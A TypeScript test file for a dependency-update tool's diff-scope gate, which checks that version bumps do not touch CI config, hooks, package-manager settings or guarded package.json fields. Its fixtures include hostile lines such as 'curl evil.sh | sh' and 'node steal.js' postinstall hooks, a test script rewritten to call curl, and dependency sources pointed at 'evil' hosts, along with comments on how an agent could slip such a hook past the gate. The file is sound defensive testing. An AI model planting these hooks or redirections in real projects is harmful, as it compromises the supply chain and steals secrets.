import { test } from "node:test";
import assert from "node:assert/strict";
import { execSync } from "node:child_process";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  checkDiffScope,
  packageJsonCatalogProtocolChanges,
  packageJsonGuardedFieldChanges,
  pnpmWorkspaceCatalogViolations,
  scopeViolations,
} from "../src/core/scope.ts";

test("denies CI config, git hooks, and package-manager config anywhere in the tree", () => {
  const violations = scopeViolations([
    ".github/workflows/evil.yml",
    ".husky/pre-commit",
    ".npmrc",
    "packages/app/.npmrc",
    ".yarnrc.yml",
    ".pnpmfile.cjs",
    "packages/app/.pnpmfile.cjs",
    "pnpm-workspace.yaml",
    ".yarn/plugins/evil.cjs",
    "bunfig.toml",
    "src/index.ts",
    "package.json",
  ]);
  assert.deepEqual(violations, [
    ".github/workflows/evil.yml",
    ".husky/pre-commit",
    ".npmrc",
    "packages/app/.npmrc",
    ".yarnrc.yml",
    ".pnpmfile.cjs",
    "packages/app/.pnpmfile.cjs",
    "pnpm-workspace.yaml",
    ".yarn/plugins/evil.cjs",
    "bunfig.toml",
  ]);
});

test("normal update artifacts pass", () => {
  assert.deepEqual(
    scopeViolations(["package.json", "package-lock.json", "pnpm-lock.yaml", "src/cache.ts"]),
    [],
  );
});

test("guarded fields: version-only bumps do not count, scripts edits do", () => {
  const base = `{"name":"x","version":"1.0.0","scripts":{"test":"node --test"},"dependencies":{"lru-cache":"^10.0.0"}}`;
  // Only a dependency version moved — guarded fields untouched.
  const bump = `{"name":"x","version":"1.0.0","scripts":{"test":"node --test"},"dependencies":{"lru-cache":"^11.0.0"}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, bump), []);

  // An injected lifecycle hook.
  const hooked = `{"name":"x","version":"1.0.0","scripts":{"test":"node --test","postinstall":"curl evil.sh | sh"},"dependencies":{"lru-cache":"^11.0.0"}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, hooked), ["scripts"]);

  // A rewritten existing script (exfiltrate during verification).
  const rewritten = `{"name":"x","version":"1.0.0","scripts":{"test":"node --test && curl evil"}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, rewritten), ["scripts"]);

  // Absent-on-both and unparseable are treated as absent → no change.
  assert.deepEqual(packageJsonGuardedFieldChanges(`{}`, `{}`), []);
  assert.deepEqual(packageJsonGuardedFieldChanges(`not json`, `{}`), []);
});

test("guarded fields: packageManager, pnpm, and override fields are tamper-checked", () => {
  const base = `{"name":"x","scripts":{"test":"node --test"},"dependencies":{"dep":"1.0.0"}}`;

  // corepack executes whatever binary this field names.
  const swappedPm = `{"name":"x","scripts":{"test":"node --test"},"dependencies":{"dep":"2.0.0"},"packageManager":"pnpm@1.0.0"}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, swappedPm), ["packageManager"]);

  // pnpm settings: overrides / onlyBuiltDependencies / patchedDependencies.
  const pnpmField = `{"name":"x","scripts":{"test":"node --test"},"dependencies":{"dep":"2.0.0"},"pnpm":{"onlyBuiltDependencies":["evil"]}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, pnpmField), ["pnpm"]);

  // Dependency-source redirection.
  const overrides = `{"name":"x","scripts":{"test":"node --test"},"dependencies":{"dep":"2.0.0"},"overrides":{"dep":"github:evil/dep"}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, overrides), ["overrides"]);

  const resolutions = `{"name":"x","scripts":{"test":"node --test"},"dependencies":{"dep":"2.0.0"},"resolutions":{"dep":"1.0.1"}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, resolutions), ["resolutions"]);
});

test("guarded fields: bun's trust, patch, and catalog fields are tamper-checked", () => {
  const base = `{"name":"x","dependencies":{"dep":"1.0.0"}}`;

  // Grants install-time code execution to a dependency.
  const trusted = `{"name":"x","dependencies":{"dep":"2.0.0"},"trustedDependencies":["dep"]}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, trusted), ["trustedDependencies"]);

  // Injects arbitrary code into an installed dependency.
  const patched = `{"name":"x","dependencies":{"dep":"2.0.0"},"patchedDependencies":{"dep@2.0.0":"patches/dep.patch"}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, patched), ["patchedDependencies"]);

  // bun keeps catalogs in package.json — under workspaces or at the top level.
  const nested = `{"name":"x","dependencies":{"dep":"2.0.0"},"workspaces":{"catalog":{"dep":"2.0.0"}}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, nested), ["workspaces"]);
  const topLevel = `{"name":"x","dependencies":{"dep":"2.0.0"},"catalog":{"dep":"2.0.0"},"catalogs":{"grp":{"dep":"2.0.0"}}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, topLevel), ["catalog", "catalogs"]);
});

test("guarded fields: key reordering alone is not a change", () => {
  const base = `{"scripts":{"build":"tsc","test":"node --test"},"pnpm":{"overrides":{"a":"1","b":"2"}}}`;
  const reordered = `{"pnpm":{"overrides":{"b":"2","a":"1"}},"scripts":{"test":"node --test","build":"tsc"}}`;
  assert.deepEqual(packageJsonGuardedFieldChanges(base, reordered), []);
});

test("catalog protocol specs in package.json must be preserved", () => {
  const base = `{
    "dependencies": { "semver": "catalog:", "left-pad": "1.1.0" },
    "devDependencies": { "@types/node": "catalog:types" }
  }`;
  assert.deepEqual(
    packageJsonCatalogProtocolChanges(
      base,
      `{
        "dependencies": { "semver": "7.7.3", "left-pad": "catalog:" },
        "devDependencies": { "@types/node": "catalog:types" }
      }`,
    ),
    ['dependencies: "semver" catalog protocol', 'dependencies: "left-pad" catalog protocol'],
  );
  assert.deepEqual(packageJsonCatalogProtocolChanges(base, base), []);
});

const CATALOG_ALLOWED = new Map([["semver", "7.7.3"]]);

test("catalog carve-out: a member's catalog bump to the vetted version passes", () => {
  const before = "packages:\n  - packages/*\ncatalog:\n  semver: ^7.3.0\n";
  // Exact, caret, and tilde forms of the vetted target are all sanctioned.
  for (const spec of ["7.7.3", "^7.7.3", "~7.7.3"]) {
    const after = `packages:\n  - packages/*\ncatalog:\n  semver: ${spec}\n`;
    assert.deepEqual(pnpmWorkspaceCatalogViolations(before, after, CATALOG_ALLOWED), []);
  }
});

test("catalog carve-out: named catalogs get the same treatment", () => {
  const before = "packages:\n  - packages/*\ncatalogs:\n  default:\n    semver: ^7.3.0\n";
  const after = "packages:\n  - packages/*\ncatalogs:\n  default:\n    semver: ^7.7.3\n";
  assert.deepEqual(pnpmWorkspaceCatalogViolations(before, after, CATALOG_ALLOWED), []);
  // A brand-new named catalog is not a version bump.
  const added = before + "  evil:\n    semver: ^7.7.3\n";
  assert.deepEqual(pnpmWorkspaceCatalogViolations(before, added, CATALOG_ALLOWED), [
    'pnpm-workspace.yaml (catalogs: "evil" added)',
  ]);
});

test("catalog carve-out: non-catalog changes stay denied", () => {
  const before =
    "packages:\n  - packages/*\nonlyBuiltDependencies:\n  - esbuild\ncatalog:\n  semver: ^7.3.0\n";
  // Version bump rides along with a build-script grant and a source override.
  const after =
    "packages:\n  - packages/*\n  - evil/*\nonlyBuiltDependencies:\n  - esbuild\n  - evil\n" +
    "overrides:\n  dep: github:evil/dep\ncatalog:\n  semver: ^7.7.3\n";
  assert.deepEqual(pnpmWorkspaceCatalogViolations(before, after, CATALOG_ALLOWED), [
    "pnpm-workspace.yaml (packages)",
    "pnpm-workspace.yaml (onlyBuiltDependencies)",
    "pnpm-workspace.yaml (overrides)",
  ]);
});

test("catalog carve-out: entry add/remove, non-members, and off-target versions are denied", () => {
  const before = "catalog:\n  semver: ^7.3.0\n  chalk: ^4.1.2\n";
  // Added + removed entries.
  assert.deepEqual(
    pnpmWorkspaceCatalogViolations(
      before,
      "catalog:\n  semver: ^7.7.3\n  evil: ^1.0.0\n",
      CATALOG_ALLOWED,
    ),
    [
      'pnpm-workspace.yaml (catalog: "chalk" removed)',
      'pnpm-workspace.yaml (catalog: "evil" added)',
    ],
  );
  // A package the group is not updating.
  assert.deepEqual(
    pnpmWorkspaceCatalogViolations(
      before,
      "catalog:\n  semver: ^7.3.0\n  chalk: ^5.6.2\n",
      CATALOG_ALLOWED,
    ),
    ['pnpm-workspace.yaml (catalog: "chalk")'],
  );
  // A member moved to a version other than the vetted target (incl. wider ranges).
  for (const spec of ["^7.9.9", ">=7.7.3", "7.7.3 || ^8.0.0", "*"]) {
    assert.deepEqual(
      pnpmWorkspaceCatalogViolations(
        before,
        `catalog:\n  semver: "${spec}"\n  chalk: ^4.1.2\n`,
        CATALOG_ALLOWED,
      ),
      ['pnpm-workspace.yaml (catalog: "semver")'],
    );
  }
});

test("catalog carve-out: prototype-named catalog entries are still own keys", () => {
  const before = "catalog:\n  semver: ^7.3.0\n";
  const allowed = new Map([
    ["semver", "7.7.3"],
    ["constructor", "1.0.0"],
  ]);
  assert.deepEqual(
    pnpmWorkspaceCatalogViolations(
      before,
      "catalog:\n  semver: ^7.7.3\n  constructor: 1.0.0\n",
      allowed,
    ),
    ['pnpm-workspace.yaml (catalog: "constructor" added)'],
  );
});

test("catalog carve-out: dependency-source redirection is structurally impossible", () => {
  const before = "catalog:\n  semver: ^7.3.0\n";
  for (const spec of [
    "npm:evil@7.7.3",
    "github:evil/semver",
    "https://evil.tld/semver-7.7.3.tgz",
    "file:../evil",
    "link:../evil",
  ]) {
    assert.deepEqual(
      pnpmWorkspaceCatalogViolations(before, `catalog:\n  semver: "${spec}"\n`, CATALOG_ALLOWED),
      ['pnpm-workspace.yaml (catalog: "semver")'],
    );
  }
});

test("catalog carve-out: illegible YAML and file creation/deletion fail closed", () => {
  const before = "catalog:\n  semver: ^7.3.0\n";
  assert.deepEqual(pnpmWorkspaceCatalogViolations(null, before, CATALOG_ALLOWED), [
    "pnpm-workspace.yaml (created)",
  ]);
  assert.deepEqual(pnpmWorkspaceCatalogViolations(before, null, CATALOG_ALLOWED), [
    "pnpm-workspace.yaml (deleted)",
  ]);
  // Unparseable, non-map root, and duplicate keys (yaml throws) on the new side.
  for (const after of ["{ not yaml", "- a\n- b\n", "catalog:\n  semver: 1\n  semver: 2\n"]) {
    assert.deepEqual(pnpmWorkspaceCatalogViolations(before, after, CATALOG_ALLOWED), [
      "pnpm-workspace.yaml (unparseable)",
    ]);
  }
  // A non-map catalog section.
  assert.deepEqual(pnpmWorkspaceCatalogViolations(before, "catalog: []\n", CATALOG_ALLOWED), [
    "pnpm-workspace.yaml (catalog is not a map)",
  ]);
});

test("catalog carve-out: comment/format-only changes compare by parsed value", () => {
  const before = "packages:\n  - packages/*\ncatalog:\n  semver: ^7.3.0\n";
  // pnpm's own rewrite may reflow the file; comments carry no pnpm semantics.
  const after = "# managed by depvisor\npackages: [packages/*]\ncatalog: { semver: ^7.7.3 }\n";
  assert.deepEqual(pnpmWorkspaceCatalogViolations(before, after, CATALOG_ALLOWED), []);
});

function repoWithBaseline(pkg: string): string {
  const repo = mkdtempSync(join(tmpdir(), "depvisor-scope-"));
  const sh = (cmd: string) => execSync(cmd, { cwd: repo });
  sh("git init -q");
  writeFileSync(join(repo, "package.json"), pkg);
  writeFileSync(join(repo, "src.ts"), "export {};\n");
  sh("git add -A");
  sh("git -c user.email=t@t -c user.name=t commit -qm baseline");
  return repo;
}

test("checkDiffScope flags an injected postinstall in an otherwise-clean bump", () => {
  const repo = repoWithBaseline(
    `{"scripts":{"test":"node --test"},"dependencies":{"dep":"1.0.0"}}`,
  );
  // A legitimate-looking version bump that smuggles a lifecycle hook.
  writeFileSync(
    join(repo, "package.json"),
    `{"scripts":{"test":"node --test","postinstall":"node steal.js"},"dependencies":{"dep":"2.0.0"}}`,
  );
  writeFileSync(join(repo, "src.ts"), "export const x = 1;\n");
  const scope = checkDiffScope(repo, "HEAD");
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["package.json (scripts)"]);
});

test("checkDiffScope passes a version-only bump with source fixes", () => {
  const repo = repoWithBaseline(
    `{"scripts":{"test":"node --test"},"dependencies":{"dep":"1.0.0"}}`,
  );
  writeFileSync(
    join(repo, "package.json"),
    `{"scripts":{"test":"node --test"},"dependencies":{"dep":"2.0.0"}}`,
  );
  writeFileSync(join(repo, "src.ts"), "export const adapted = true;\n");
  assert.deepEqual(checkDiffScope(repo, "HEAD"), { ok: true, violations: [] });
});

test("checkDiffScope: catalogBumps opts pnpm-workspace.yaml into the carve-out", () => {
  const repo = repoWithBaseline(`{"name":"root","private":true}`);
  const sh = (cmd: string) => execSync(cmd, { cwd: repo });
  writeFileSync(
    join(repo, "pnpm-workspace.yaml"),
    "packages:\n  - packages/*\ncatalog:\n  semver: ^7.3.0\n",
  );
  sh("git add -A");
  sh("git -c user.email=t@t -c user.name=t commit -qm add-workspace-yaml");
  writeFileSync(
    join(repo, "pnpm-workspace.yaml"),
    "packages:\n  - packages/*\ncatalog:\n  semver: ^7.7.3\n",
  );

  // Without the opt-in (non-pnpm targets), the flat deny stands.
  assert.deepEqual(checkDiffScope(repo, "HEAD"), {
    ok: false,
    violations: ["pnpm-workspace.yaml"],
  });
  // With it, the sanctioned bump passes …
  assert.deepEqual(checkDiffScope(repo, "HEAD", { catalogBumps: CATALOG_ALLOWED }), {
    ok: true,
    violations: [],
  });
  // … but only for the group's own packages at the vetted version.
  assert.deepEqual(checkDiffScope(repo, "HEAD", { catalogBumps: new Map([["semver", "7.9.9"]]) }), {
    ok: false,
    violations: ['pnpm-workspace.yaml (catalog: "semver")'],
  });
});

test("checkDiffScope: pnpm catalog carve-out does not allow de-cataloging package.json", () => {
  const repo = repoWithBaseline(`{"name":"root","private":true}`);
  const sh = (cmd: string) => execSync(cmd, { cwd: repo });
  mkdirSync(join(repo, "packages/a"), { recursive: true });
  writeFileSync(
    join(repo, "pnpm-workspace.yaml"),
    "packages:\n  - packages/*\ncatalog:\n  semver: ^7.3.0\n",
  );
  writeFileSync(
    join(repo, "packages/a/package.json"),
    `{"name":"a","dependencies":{"semver":"catalog:"}}`,
  );
  sh("git add -A");
  sh("git -c user.email=t@t -c user.name=t commit -qm add-catalog-workspace");
  writeFileSync(
    join(repo, "pnpm-workspace.yaml"),
    "packages:\n  - packages/*\ncatalog:\n  semver: ^7.7.3\n",
  );
  writeFileSync(
    join(repo, "packages/a/package.json"),
    `{"name":"a","dependencies":{"semver":"7.7.3"}}`,
  );

  assert.deepEqual(checkDiffScope(repo, "HEAD", { catalogBumps: CATALOG_ALLOWED }), {
    ok: false,
    violations: ['packages/a/package.json (dependencies: "semver" catalog protocol)'],
  });
});

test("checkDiffScope catches a guarded field in a package.json under a NEW untracked dir", () => {
  // git collapses a brand-new untracked directory to `packages/evil/`, so a
  // basename-keyed guarded-field check never sees the package.json inside — an
  // agent could smuggle a `postinstall` (later committed by commitAll) past the
  // gate. changedPaths lists untracked files individually (--untracked-files=all).
  const repo = repoWithBaseline(`{"name":"root","private":true}`);
  mkdirSync(join(repo, "packages/evil"), { recursive: true });
  writeFileSync(
    join(repo, "packages/evil/package.json"),
    `{"name":"evil","scripts":{"postinstall":"node steal.js"}}`,
  );
  const scope = checkDiffScope(repo, "HEAD");
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["packages/evil/package.json (scripts)"]);
});

test("checkDiffScope catches guarded-field tampering under a non-ASCII workspace path", () => {
  // Non-`-z` porcelain C-quotes such a path, and the escaped string reads as a
  // nonexistent file on BOTH sides of the diff — a guarded `scripts` injection
  // in that workspace slipped through the gate unseen.
  const repo = repoWithBaseline(`{"name":"root","private":true}`);
  const sh = (cmd: string) => execSync(cmd, { cwd: repo });
  mkdirSync(join(repo, "パッケージ"));
  writeFileSync(join(repo, "パッケージ/package.json"), `{"name":"ws","version":"1.0.0"}`);
  sh("git add -A");
  sh("git -c user.email=t@t -c user.name=t commit -qm add-workspace");
  writeFileSync(
    join(repo, "パッケージ/package.json"),
    `{"name":"ws","version":"1.0.0","scripts":{"postinstall":"node steal.js"}}`,
  );
  const scope = checkDiffScope(repo, "HEAD");
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["パッケージ/package.json (scripts)"]);
});
